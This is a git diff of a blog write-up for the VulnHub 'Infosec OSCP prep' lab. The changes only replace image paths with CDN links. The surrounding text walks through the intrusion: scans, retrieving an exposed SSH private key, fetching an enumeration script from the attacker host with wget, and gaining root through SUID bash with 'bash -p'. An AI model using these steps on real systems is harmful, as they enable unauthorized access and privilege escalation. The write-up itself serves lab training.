@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "images/cover.png"
+  image: "https://cdn.ziomsec.com/infosec_oscp_prep/cover.png"
   caption: "Infosec OSCP prep VulnHub Challenge"
   alt: "Infosec OSCP prep cover"
 platform: "VulnHub"
@@ -39,15 +39,15 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 | 80       | http        |
 | 33060    | mysql       |
 
-![](images/1.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/1.png)
 
 ## Initial Foothold
 
 I visited the web application that was running on the target using my browser.
 
-![](images/2.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/2.png)
 
-![](images/3.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/3.png)
 
 The home page disclosed 2 things:
 - Username: *oscp*.
@@ -55,11 +55,11 @@ The home page disclosed 2 things:
 
 Upon closer inspection, when I clicked on the *SAMPLE PAGE* button on the top right corner, I got redirected to another page. I scrolled down and found a link to go to a login page.
 
-![](images/4.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/4.png)
 
 Upon clicking the *Log in* button, I got redirected to a wordpress login panel.
 
-![](images/5.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/5.png)
 
 To find more hidden directories and files, I ran a scan using **dirb**.
 
@@ -67,17 +67,17 @@ To find more hidden directories and files, I ran a scan using **dirb**.
 dirb http://TARGET/ /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 ```
 
-![](images/6.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/6.png)
 
-![](images/7.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/7.png)
 
 I visited the *robots.txt* page and found a link to a file called *secret.txt*
 
-![](images/8.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/8.png)
 
 Upon visiting *secret.txt*, I get a base64 encoded block of text.
 
-![](images/9.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/9.png)
 
 I decoded this file and downloaded it onto my system.
 
@@ -85,7 +85,7 @@ I decoded this file and downloaded it onto my system.
 curl http://TARGET/secret.txt | base64 -d > secret.txt
 ```
 
-![](images/10.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/10.png)
 
 It turned out to be a private key. In order to **ssh** into the target using it, I had to find a valid username. Since the site was running on WordPress, I ran a scan using **wpscan** but didn't find anything besides the version and theme.
 
@@ -93,9 +93,9 @@ It turned out to be a private key. In order to **ssh** into the target using it,
 wpscan --url http://192.168.1.7
 ```
 
-![](images/11.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/11.png)
 
-![](images/12.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/12.png)
 
 I had earlier identified a username called *oscp* so, I tried using it along with the private key. To use the key for authentication, I modified its permissions so that only the owner has read and write access.
 
@@ -104,7 +104,7 @@ mv secret.txt private.key
 chmod 600 private.key
 ```
 
-![](images/13.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/13.png)
 
 I then authenticated to the box using the key:
 
@@ -112,7 +112,7 @@ I then authenticated to the box using the key:
 ssh -i private.key oscp@TARGET
 ```
 
-![](images/14.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/14.png)
 
 I got initial access to the system.
 
@@ -129,11 +129,11 @@ wget "http://KALI/lse.sh"
 chmod +x lse.sh
 ```
 
-![](images/15.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/15.png)
 
 It detected an **SUID** bit on the **bash** binary.
 
-![](images/16.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/16.png)
 
 I manually verified this by using the following command:
 
@@ -141,7 +141,7 @@ I manually verified this by using the following command:
 find / -user root -perm -u=s -ls 2>/dev/null
 ```
 
-![](images/17.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/17.png)
 
 Now I can simply type **bash -p** to get root access.
 
@@ -151,7 +151,7 @@ The **bash -p** command starts a new instance of the Bash shell in "privileged" 
 
 With root access, I captured the flag from the *root* directory.
 
-![](images/18.png)
+![](https://cdn.ziomsec.com/infosec_oscp_prep/18.png)
 
 ## Closure
 
